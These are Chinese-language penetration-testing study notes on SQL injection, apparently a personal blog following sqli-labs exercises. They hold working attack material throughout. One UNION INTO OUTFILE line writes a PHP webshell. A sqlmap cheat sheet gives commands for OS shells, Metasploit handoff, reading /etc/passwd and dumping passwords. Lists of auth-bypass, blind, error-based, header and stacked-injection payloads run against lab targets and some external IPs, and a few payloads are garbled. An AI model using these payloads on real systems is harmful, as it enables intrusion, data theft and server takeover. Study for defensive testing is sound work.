<p>常见写入文件问题:魔术引号开关<br>
union select 1,<code>'&lt;?php $eval($_POST['dudu']);?&gt;'</code>,3 into outfile 'D:\WWW\DUDU.php'</p>
<p>魔术引号及常见保护<br>
php.ini中存在magic_quotes_gpc选项，称为魔术引号，此选项打开，使用get，post，cookie所接受的'单引号，“双引号，\反斜线，和NULL字符全都被加上一个反斜线转义，此时，注入类型是字符型注入已经无法构成威胁</p>
<p>isset无法绕过 替换关键字</p>
<p>在数据库使用了宽字符集而web中没考虑这个问题的情况下，在web层，由于0XBF27是两个字符，在PHP中比如addslash和magic_quotes_gpc开启时，由于会对0X27单引号进行转义，因此0xbf5c27，而数据进入数据库中时，由于0XBF5C是另外一个字符，因此转移符号会被前面的bf&quot;吃掉&quot;，单引号由此逃逸出来可以用来闭合语句</p>
<p>自定义关键字替换</p>
<p>WAF对常见攻击语句进行爆错绕过思路</p>
<p>低版本注入配合读取或者暴力<br>
5.0版本以下，跑字典<br>
字典或读取</p>
<h1 id="十四sql注入之类型及提交注入">十四：SQL注入之类型及提交注入</h1>
<p>简要明确参数类型<br>
数字，字符，搜索，json等<br>
简要明确请求方法<br>
GET,POST,COOKIE,REQUEST,HTTP头<br>
其中SQL语句干扰符号：' &quot; % ) } 等，具体查看用法</p>
<p>非字符串需要单，双引号括起 需要闭合，才能形成and 1=1 逻辑判断</p>
<p>前提是寻求请求方法，然后来进行测试。</p>
<p>需了解json类型的注入</p>
<h1 id="2021-10-06">2021-10-06</h1>
<h1 id="sql注入之oraclemongodb等注入">SQL注入之Oracle，MongoDB等注入</h1>
<p><img src="https://jinqipiaopiao.github.io//post-images/1633485604417.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633485624129.png" alt="" loading="lazy"></p>
<p><strong>简要学习各种数据库的注入特点</strong><br>
数据库架构组成，数据库高权限操作</p>
<p>ACCESS,MYSQL,MSSQL,MONGODB,POSTGRESQL,SQLITE,ORACLE,SYBASE等<br>
除了Access其他数据库组成架构基本都是大同小异<br>
Access 表名，列名，数据</p>
<p>access数据库保存在网站源码下面，自己网站数据库独立存在，没有文件读写的操作<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633485800302.png" alt="" loading="lazy"></p>
<p>mysql mssql等<br>
数据库名A<br>
表名<br>
列名<br>
数据<br>
数据库名B<br>
。。。。。。</p>
<p>每个数据库功能不同，我们采取注入的时候攻入方式不同</p>
<p><strong>什么决定注入点用户权限？</strong><br>
<strong>数据库配置文件</strong></p>
<p><strong>Access</strong><br>
用sqlmap判断数据库类型<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633485885586.png" alt="" loading="lazy"></p>
<p>Access只是单纯的数据库，只有数据，没有数据库名，数据库版本，操作系统等功能，没有information_shcema。可直接查询数据，获取表名，列名。<br>
用猜解方式猜解表名，列名</p>
<pre><code>219.153.49.228:43932/new_list.asp?id=-1 union select 1,2,3,4 from admin
219.153.49.228:43932/new_list.asp?id=-1 union select username,passwd,3,4 from admin
</code></pre>
<figure data-type="image" tabindex="12"><img src="https://jinqipiaopiao.github.io//post-images/1633485973780.png" alt="" loading="lazy"></figure>
<p><strong>access注入时，如果列名或者表名才接不到的情况怎么办?</strong><br>
<strong>Access偏移注入</strong></p>
<p>偏移注入主要是针对知道表，但是不知道字段的ACCESS数据库。</p>
<p>比如我们已经知道了表名是 admin</p>
<p>1.判断字段数：</p>
<pre><code>http://192.168.74.136:8002/Production/PRODUCT_DETAIL.asp?id=1406 order by 22            返回正常
http://192.168.74.136:8002/Production/PRODUCT_DETAIL.asp?id=1406 order by 23           返回错误
</code></pre>
<p>2.字段数为 22</p>
<p>爆出显示位：</p>
<pre><code>http://192.168.74.136:8002/Production/PRODUCT_DETAIL.asp?id=1406 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin
</code></pre>
<figure data-type="image" tabindex="13"><img src="https://jinqipiaopiao.github.io//post-images/1633486232145.png" alt="" loading="lazy"></figure>
<p>3.判断表内存在的字段数</p>
<pre><code>http://192.168.74.136:8002/Production/PRODUCT_DETAIL.asp?id=1406 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from admin       返回同上图一样得显示位页面
http://192.168.74.136:8002/Production/PRODUCT_DETAIL.asp?id=1406 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,* from admin   返回错误
</code></pre>
<p>说明了admin表下有6个字段；</p>
<p>用&quot;<em>&quot;代表 admin 表的字段数，计算</em>代替字符的位数。</p>
<p>Access偏移注入原理，基本公式为：</p>
<p>order by 出的字段数减去*号的字段数，然而再用order by的字段数减去2倍刚才得出来的答案；</p>
<p>也就是：</p>
<pre><code>`* = 6个字符`

2 × * = 12个字符

22 - 12 = 10个字符
</code></pre>
<p>5.注入公式如下：(爆破内容是随机的)<br>
一级偏移注入公式：</p>
<pre><code>http://192.168.74.136:8002/Production/PRODUCT_DETAIL.asp?id=1406 union select 1,2,3,4,5,6,7,8,9,10,* from (admin as a inner join admin as b on a.id = b.id)
</code></pre>
<p>此时可以增加a.id或者b.id或者a.id和b.id一起加上去来改变随机爆破出来的内容比如：</p>
<pre><code>http://192.168.74.136:8002/Production/PRODUCT_DETAIL.asp?id=1406 union select 1,2,3,4,5,6,7,8,9,10,a.id,b.id,* from (admin as a inner join admin as b on a.id = b.id)
</code></pre>
<p>二级偏移注入公式：</p>
<pre><code>http://192.168.74.136:8002/Production/PRODUCT_DETAIL.asp?id=1406 union select 1,2,3,4,* from ((admin as a inner join admin as b on a.id = b.id)inner join admin as c on a.id=c.id)
</code></pre>
<p>此时可以增加a.id或者b.id或者a.id和b.id一起加上去来改变随机爆破出来的内容比如：</p>
<pre><code>http://192.168.74.136:8002/Production/PRODUCT_DETAIL.asp?id=1406 union select 1,2,3,4,a.id,b.id,c.id,* from ((admin as a inner join admin as b on a.id = b.id)inner join admin as c on a.id=c.id)
</code></pre>
<p>注意：这里是10个字段再减去了表里的6个字段，所以二级偏移这里是select 1,2,3,4</p>
<p>注意：查看源代码有奇效，可能会出现惊喜<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633486438563.png" alt="" loading="lazy"></p>
<p>简要学习各种注入工具的使用指南<br>
熟悉工具的支持库，注入模式，优缺点等</p>
<p>Sqlmap，NoSQLAttack，Pangolin等</p>
<p>安装Sqlmap<br>
image-20210812224625210<br>
来源网站：https://www.cnblogs.com/bmjoker/p/9326258.html<br>
安装Sqlmap</p>
<p>基本操作笔记：-u  #注入点<br>
-f  #指纹判别数据库类型<br>
-b  #获取数据库版本信息<br>
-p  #指定可测试的参数(?page=1&amp;id=2 -p &quot;page,id&quot;)<br>
-D &quot;&quot;  #指定数据库名<br>
-T &quot;&quot;  #指定表名<br>
-C &quot;&quot;  #指定字段<br>
-s &quot;&quot;  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s &quot;xx.log&quot;　　恢复:-s &quot;xx.log&quot; --resume)<br>
--level=(1-5) #要执行的测试水平等级，默认为1<br>
--risk=(0-3)  #测试执行的风险等级，默认为1<br>
--time-sec=(2,5) #延迟响应，默认为5<br>
--data #通过POST发送数据<br>
--columns        #列出字段<br>
--current-user   #获取当前用户名称<br>
--current-db     #获取当前数据库名称<br>
--users          #列数据库所有用户<br>
--passwords      #数据库用户所有密码<br>
--privileges     #查看用户权限(--privileges -U root)<br>
-U               #指定数据库用户<br>
--dbs            #列出所有数据库<br>
--tables -D &quot;&quot;   #列出指定数据库中的表<br>
--columns -T &quot;user&quot; -D &quot;mysql&quot;      #列出mysql数据库中的user表的所有字段<br>
--dump-all            #列出所有数据库所有表<br>
--exclude-sysdbs      #只列出用户自己新建的数据库和表<br>
--dump -T &quot;&quot; -D &quot;&quot; -C &quot;&quot;   #列出指定数据库的表的字段的数据(--dump -T users -D master -C surname)<br>
--dump -T &quot;&quot; -D &quot;&quot; --start 2 --top 4  # 列出指定数据库的表的2-4字段的数据<br>
--dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB)<br>
--os      #指定系统(Linux,Windows)<br>
-v  #详细的等级(0-6)<br>
0：只显示Python的回溯，错误和关键消息。<br>
1：显示信息和警告消息。<br>
2：显示调试消息。<br>
3：有效载荷注入。<br>
4：显示HTTP请求。<br>
5：显示HTTP响应头。<br>
6：显示HTTP响应页面的内容<br>
--privileges  #查看权限<br>
--is-dba      #是否是数据库管理员<br>
--roles       #枚举数据库用户角色<br>
--udf-inject  #导入用户自定义函数（获取系统权限）<br>
--union-check  #是否支持union 注入<br>
--union-cols #union 查询表记录<br>
--union-test #union 语句测试<br>
--union-use  #采用union 注入<br>
--union-tech orderby #union配合order by<br>
--data &quot;&quot; #POST方式提交数据(--data &quot;page=1&amp;id=2&quot;)<br>
--cookie &quot;用;号分开&quot;      #cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”)<br>
--referer &quot;&quot;     #使用referer欺骗(--referer &quot;http://www.baidu.com&quot;)<br>
--user-agent &quot;&quot;  #自定义user-agent<br>
--proxy &quot;http://127.0.0.1:8118&quot; #代理注入<br>
--string=&quot;&quot;    #指定关键词,字符串匹配.<br>
--threads 　　  #采用多线程(--threads 3)<br>
--sql-shell    #执行指定sql命令<br>
--sql-query    #执行指定的sql语句(--sql-query &quot;SELECT password FROM mysql.user WHERE user = 'root' LIMIT 0, 1&quot; )<br>
--file-read    #读取指定文件<br>
--file-write   #写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt)<br>
--file-dest    #要写入的文件绝对路径<br>
--os-cmd=id    #执行系统命令<br>
--os-shell     #系统交互shell<br>
--os-pwn       #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/)<br>
--msf-path=    #matesploit绝对路径(--msf-path=/opt/framework/msf3/)<br>
--os-smbrelay  #<br>
--os-bof       #<br>
--reg-read     #读取win系统注册表<br>
--priv-esc     #<br>
--time-sec=    #延迟设置 默认--time-sec=5 为5秒<br>
-p &quot;user-agent&quot; --user-agent &quot;sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)&quot;  #指定user-agent注入<br>
--eta          #盲注<br>
/pentest/database/sqlmap/txt/<br>
common-columns.txt　　字段字典　　　<br>
common-outputs.txt<br>
common-tables.txt      表字典<br>
keywords.txt<br>
oracle-default-passwords.txt<br>
user-agents.txt<br>
wordlist.txt</p>
<pre><code>常用语句 :
1./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --users --passwords --dbs -v 0 
2./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2 
3./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -T users -C username -D userdb --start 2 --stop 3 -v 2 
4./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -C &quot;user,pass&quot;  -v 1 --exclude-sysdbs 
5./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 
6./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-read &quot;c:\boot.ini&quot; -v 2 
7./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 
8./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-cmd &quot;id&quot; -v 1 
9./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 
10./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1 
11./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1 
12./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1 
13./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --reg-add --reg-key=&quot;HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap&quot; --reg-value=Test --reg-type=REG_SZ --reg-data=1 
14./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --eta 
15./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id --prefix &quot;')&quot; --suffix &quot;AND ('abc'='abc&quot;
16./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot; --auth-type Basic --auth-cred &quot;testuser:testpass&quot;
17./sqlmap.py -l burp.log --scope=&quot;(www)?\.target\.(com|net|org)&quot;
18./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot; --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 
19./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot; --sql-query &quot;SELECT 'foo'&quot; -v 1 
20./sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --common-tables -D testdb --banner 
21./sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --cookie=&quot;PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low&quot; --string='xx' --dbs --level=3 -p &quot;uid&quot;

简单的注入流程 :
1.读取数据库版本，当前用户，当前数据库 
sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 
2.判断当前数据库用户权限 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 
3.读取所有数据库用户或指定数据库用户的密码 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 
4.获取所有数据库 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 
5.获取指定数据库中的所有表 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 
6.获取指定数据库名中指定表的字段 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2 
7.获取指定数据库名中指定表中指定字段的数据 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C &quot;username,password&quot; -s &quot;sqlnmapdb.log&quot; -v 2 
8.file-read读取web文件 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read &quot;/etc/passwd&quot; -v 2 
9.file-write写入文件到web 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试：

涉及资源
https://www.cnblogs.com/bmjoker/p/9326258.html

http://github.com/youngyangyang04/NoSQLAttack

https://github.com/sqlmapproject/sqlmap/zipball/master

https://blog.csdn.net/qq_39936434/category_9103379.html、
</code></pre>
<h1 id="2021-10-07">2021-10-07</h1>
<p>WEB漏洞-SQL注入之查询方式及报错盲注<br>
当进行SQL注入时，有很多注入会出现无回显的情况，其中不回显的原因可能是SQL语句查询方式的问题导致，这个时候我们需要用到相关的报错或盲注进行后续操作，同时作为手工注入时，提前了解或预知其SQL语句大概写法也能更好地选择对应的注入语句。</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1633661356824.png" alt="" loading="lazy"><br>
补充：Access暴力猜解不出的问题？</p>
<p>Access偏移注入：解决列名获取不到的情况</p>
<p>在已知表名不知列名的前提下（表名admin）</p>
<pre><code>?id=1513 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin
</code></pre>
<p>将选取的内容替换为“*”（页面报错）</p>
<pre><code>?id=1513 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,* from admin
</code></pre>
<p>删减选取的内容直到页面正常</p>
<pre><code>?id=1513 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,* from admin

?id=1513 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from admin（页面正常）
</code></pre>
<p>所以<code>“*”</code>代替的字符串=22-16=6，说明admin里有6个列</p>
<p><code>“*”</code>后面的内容长度看作和<code>“*”</code>一样，这里剪掉两个<code>“*”</code>的长度</p>
<p>一级偏移语句：</p>
<pre><code>?id=1513 UNION SELECT 1,2,3,4,5,6,7,8,9,10,* from (admin as a inner join admin as b on a.id = b.id)
</code></pre>
<p>查看源代码，会发现随机爆出的数据内容</p>
<p>如果无效尝试二级偏移</p>
<p>二级偏移语句：</p>
<pre><code>?id=1513 UNION SELECT 1,2,3,4,a.id,b.id,c.id,* from ((admin as a inner join admin as b on a.id = b.id)inner join as c on a.id=c.id)
</code></pre>
<p></p>
<p>查看登录框源代码的表单值或观察URL特征等也可以针对表或列获取不到的情况</p>
<p>有时猜解不到是因为表名有前缀，可以通过观察是否存在特定的前缀等来尝试</p>
<p></p>
<p>注入无回显的原因</p>
<p>SQL语句查询方式导致的</p>
<p>未使用显示代码或使用不当导致的</p>
<p></p>
<p>常见SQL语句</p>
<p>select 查询数据</p>
<p>在网站应用中进行数据显示查询操作</p>
<pre><code>select * from news where id=$id
</code></pre>
<p></p>
<p>insert 插入数据</p>
<p>在网站应用中进行用户注册添加等操作</p>
<pre><code>insert into news(id,url,text) values(2,'x','$t')
</code></pre>
<p></p>
<p>delete 删除数据</p>
<p>后台管理里面删除文章删除用户等操作</p>
<pre><code>delete from news where id=$id
</code></pre>
<p></p>
<p>update 更新数据</p>
<p>会员或后台中心数据同步或缓存等操作</p>
<pre><code>update user set pwd='$p' where id=2 and username='admin'
</code></pre>
<p></p>
<p>order by 排列数据</p>
<p>一般结合表名或列名进行数据排序操作</p>
<pre><code>select * from news order by $id

select id,name,price from news order by $order
</code></pre>
<p></p>
<p>重点理解：</p>
<p>我们可以通过以上查询方式与网站应用的关系去猜测注入点产生地方或应用和对方的SQL查询方式。</p>
<p></p>
<p>SQL注入报错盲注</p>
<p>盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行半段或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类：</p>
<p></p>
<p>基于布尔的SQL盲注-逻辑判断</p>
<p>regexp，like，ascii，left，ord，mid</p>
<pre><code>?id=1’ and left(database(),2)=’se’--+（正确则页面正常，错误则页面异常）
</code></pre>
<p></p>
<p>基于时间的SQL盲注-延时判断</p>
<pre><code>if，sleep

?id=1 and sleep(if(database()=’pikachu’,5,0))--+

?id=1 and sleep(if(length(database())=8,5,0))--+

?id=1 and sleep(if(mid(database(),1,1)=’s’,5,0))--+

?id=1 and sleep(if(ascii(mid(database(),1,1))=115,5,0))--+

（用ASCII码可以避免引号转义，也方便写脚本）

?id=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(3),0)--+
</code></pre>
<p></p>
<p>基于报错的SQL盲注-报错回显</p>
<pre><code>floor，updatexml，extractvalue
</code></pre>
<p>https://www.jianshu.com/p/bc35f8dd4f7c</p>
<p>1、通过floor报错,注入语句如下:<br>
and select 1 from (select count(),concat(version(),floor(rand(0)2))x from information_schema.tables group by x)a);</p>
<p>2、通过ExtractValue报错,注入语句如下:<br>
and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</p>
<p>3、通过UpdateXml报错,注入语句如下:<br>
and 1=(updatexml(1,concat(0x3a,(select user())),1))</p>
<p>4、通过NAME_CONST报错,注入语句如下:<br>
and exists(selectfrom (selectfrom(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)</p>
<p>5、通过join报错,注入语句如下:<br>
select * from(select * from mysql.user ajoin mysql.user b)c;</p>
<p>6、通过exp报错,注入语句如下:<br>
and exp(~(select * from (select user () ) a) );</p>
<p>7、通过GeometryCollection()报错,注入语句如下:<br>
and GeometryCollection(()select *from(select user () )a)b );</p>
<p>8、通过polygon ()报错,注入语句如下:<br>
and polygon (()select * from(select user ())a)b );</p>
<p>9、通过multipoint ()报错,注入语句如下:<br>
and multipoint (()select * from(select user() )a)b );</p>
<p>10、通过multlinestring ()报错,注入语句如下:<br>
and multlinestring (()select * from(selectuser () )a)b );</p>
<p>11、通过multpolygon ()报错,注入语句如下:<br>
and multpolygon (()select * from(selectuser () )a)b );</p>
<p>12、通过linestring ()报错,注入语句如下:<br>
and linestring (()select * from(select user() )a)b );</p>
<p>关于POST注入<br>
常用的万能username语句：</p>
<pre><code>a ’ or 1=1 #
a &quot;) or 1=1 #
a‘) or 1=1 #
a” or “1”=”1
' or '1'='1
' or (length(database())) = 8 (用于输入’ “都没有错误)
' or (ascii(substr((select database()) ,1,1))) = 115 # (用于输入’ “都没有错误)
&quot;) or (&quot;1&quot;)=(&quot;1
&quot;) or 1=1 or if(1=1, sleep(1), null) #
&quot;) or (length(database())) = 8 #
&quot;) or (ascii(substr((select database()) ,1,1))) = 115 or if(1=1, sleep(1), null) #
</code></pre>
<p>post型盲注通杀payload：<br>
uname=admin%df'or()or%200%23&amp;passwd=&amp;submit=Submit</p>
<p>关于UPDATEXML,REFERER,COOKIE的构造<br>
User-Agent:.........' or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) #<br>
Referer: ’ or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) #<br>
Cookie:username: admin ’ or updatexml(1,concat(0x7e,database(),0x7e),1) #</p>
<p>updatexml报错注入<br>
爆数据库版本信息：?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)<br>
链接用户：?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)<br>
链接数据库：?id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)<br>
爆库：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM admin limit 0,1),0x7e),1)<br>
爆表：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM admin limit 0,1),0x7e),1)<br>
爆字段：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM admin limit 0,1),0x7e),1)<br>
爆字段内容：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)</p>
<p>作者：L0ki<br>
链接：https://www.jianshu.com/p/bc35f8dd4f7c<br>
来源：简书<br>
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
<p>参考：</p>
<pre><code>like ‘ro%’                        判断ro或ro...是否成立

regexp ‘xiaodi[a-z]’        匹配xiaodi及xiaodi...等

if(条件,5,0)                     条件成立则返回5，反之返回0

sleep(5)                         SQL语句延时执行5秒

mid(a,b,c)                      从位置b开始，截取a字符串的c位

substr(a,b,c)                  从b位置开始，截取字符串a的c长度

left(database(),1),database()    left(a,b)从左侧截取a的前b位

length(database())=8    判断数据库database()名的长度

ord=ascii ascii(x)=97     判断x的ascii码是否等于97
</code></pre>
<p></p>
<p>其他</p>
<p>如果需要在请求行注入，用“+”或“%20”代替空格</p>
<p></p>
<p>涉及资源：</p>
<p>12种报错注入+万能语句：https://www.jianshu.com/p/bc35f8dd4f7c</p>
<p>Order by排序注入方法小总结：https://www.jianshu.com/p/fcae21926e5c</p>
<p>asp+access注入源码：https://pan.baidu.com/s/1IX6emxDpvYrVZbQzJbHn3g 提取码：l9f6 作者：shtome https://www.bilibili.com/read/cv12614611/ 出处：bilibili</p>
<h1 id="2021-10-08">2021-10-08</h1>
<h1 id="web漏洞-二次加解密dns等注入">WEB漏洞-二次,加解密,DNS等注入</h1>
<p>#加解密，二次，DNSlog注入<br>
注入原理，演示案例，实际应用(中转注入)</p>
<p>sqlilabs-less21-cookie&amp;加解密注入<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663517663.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663522462.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663525995.png" alt="" loading="lazy"></p>
<p>Decode as base64，把%3D改成=号，得出结果。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663529093.png" alt="" loading="lazy"></p>
<p>注入点在cookie，输入' and 1=1 要进行base64加密处理<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663533785.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663538378.png" alt="" loading="lazy"></p>
<p>接收cookie值uname赋予给cookee，对cookee进行base64_decode解码，解码之后带入数据库中。注入语句要还原它的加密方式，把注入语句按照它的加密方式进行加密，然后再提交<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663552278.png" alt="" loading="lazy"></p>
<p>演示</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1633663556536.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663561681.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663566406.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663571256.png" alt="" loading="lazy"></p>
<p>实例</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1633663579757.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663588120.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663593531.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663598992.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663603030.png" alt="" loading="lazy"></p>
<p><strong>sqlilabs-less24-post登录框&amp;二次注入</strong><br>
二次注入无法通过扫描工具或者代码自己手工测试出来的，二次注入一般会产生在网站程序源代码才会发现的注入漏洞，从前端或者黑盒测试是看不到这个漏洞。<br>
二次注入原理，主要分为两步：<br>
第一步：插入恶意数据<br>
第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身包含恶意内容。<br>
第二步：引用恶意数据<br>
在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。</p>
<figure data-type="image" tabindex="14"><img src="https://jinqipiaopiao.github.io//post-images/1633663608196.png" alt="" loading="lazy"></figure>
<p>注册新用户</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1633663707056.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663620349.png" alt="" loading="lazy"></p>
<p>登录进行修改密码界面，把原始密码123456修改成xxxxxx</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1633663714025.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663719957.png" alt="" loading="lazy"></p>
<p>修改完成，查看数据库，修改密码的账号为dhakkan</p>
<figure data-type="image" tabindex="15"><img src="https://jinqipiaopiao.github.io//post-images/1633663725446.png" alt="" loading="lazy"></figure>
<p>查看源码</p>
<figure data-type="image" tabindex="16"><img src="https://jinqipiaopiao.github.io//post-images/1633663739786.png" alt="" loading="lazy"></figure>
<p>插入语句中是没有单引号的，所以不会屏蔽，后来修改密码用的是update语句，这个语句有单引号。</p>
<p><strong>sqlilabs-less9-load_file&amp;dnslog带外注入</strong></p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1633663748466.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663754245.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663759018.png" alt="" loading="lazy"></p>
<p><strong>py-DnslogSqlinj-dnslog诸如演示脚本演示</strong><br>
工具：https://github.com/ADOOO/DnslogSqlinj</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1633663764881.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663772649.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633663778378.png" alt="" loading="lazy"></p>
<p><strong>py-DnslogSqlinj-dnslog诸如演示脚本演示</strong><br>
工具：https://github.com/ADOOO/DnslogSqlinj</p>
<h1 id="web漏洞-sql注入之堆叠及waf绕过注入">WEB漏洞-SQL注入之堆叠及WAF绕过注入</h1>
<figure data-type="image" tabindex="17"><img src="https://jinqipiaopiao.github.io//post-images/1633665500039.png" alt="" loading="lazy"></figure>
<p>** 堆叠查询注入**<br>
Stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆sql语句(多条)一起执行。而在真实的运用中也是这样的，我们知道在mysql中，主要是命令行中，每一条语句结尾加;表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。<br>
堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎的不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些数据。</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1633665505654.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633665508860.png" alt="" loading="lazy"></p>
<p><strong>Sqlilabs-Less38-堆叠注入(多语句)</strong></p>
<pre><code>http://127.0.0.1/sqli-labs/Less-38/?id=1';insert into users(id,username,password) values ('38','less38','hello')--+
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1633665512922.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633665517183.png" alt="" loading="lazy"></p>
<p>注入需要管理员账号密码，密码是加密，无法解密，使用堆叠注入进行插入数据，用户密码自定义的，可以正常解密登录。<br>
mtype:会员类别</p>
